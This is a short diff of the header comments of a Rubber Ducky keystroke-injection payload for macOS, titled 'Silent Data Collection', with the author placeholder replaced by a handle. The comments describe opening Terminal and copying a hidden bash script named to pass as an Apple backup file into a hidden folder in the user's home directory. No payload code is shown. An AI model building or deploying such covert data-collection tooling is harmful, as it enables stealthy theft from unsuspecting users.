@@ -1,6 +1,6 @@
 REM ================================================
 REM Rubber Ducky Payload: macOS Silent Data Collection
-REM Author: [Your Name/Handle]
+REM Author: un1x01d 
 REM Description: This payload targets macOS systems.
 REM It opens Terminal, copies a hidden bash script (`com.apple.iphone.backup`)
 REM to a hidden directory within the user’s home directory,
